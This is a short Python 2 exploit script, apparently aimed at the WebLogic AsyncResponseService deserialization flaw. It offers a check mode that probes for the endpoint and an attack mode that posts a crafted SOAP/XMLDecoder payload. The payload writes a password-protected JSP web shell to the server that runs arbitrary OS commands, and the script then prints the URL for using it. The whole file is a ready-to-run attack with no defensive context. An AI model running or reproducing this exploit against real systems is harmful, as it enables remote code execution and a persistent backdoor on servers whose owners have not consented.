# -*- coding: UTF-8 -*-
import sys, getopt
import requests

def check(url):
    print "try "+url
    response = requests.get(url+"/_async/AsyncResponseService")
    if response.status_code==200:
        print "It might be work!"
    else:
        print "Unlucky,try another one..."
def attack(url):
    urll=url+'/_async/AsyncResponseService'
    headers = {'content-type': 'text/xml'}
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string><void method="println"><string><![CDATA[
<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[1024];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
    r= requests.post(urll,headers=headers,data=data)
    if r.status_code==202:
        print "Done~ try "+url+"/_async/webshell.jsp?pwd=123&cmd=whoami"
    else:
        print "Something wrong"

try:
    options,args = getopt.getopt(sys.argv[1:],"hc:a:",["help","check=","attack="])
except getopt.GetoptError:
    sys.exit()
for name,value in options:
    if name in("h","-help"):
        print "-c url or -a url"
    if name in ("-c","--check"):
        check(value)
    if name in ("-a","--attack"):
        attack(value)
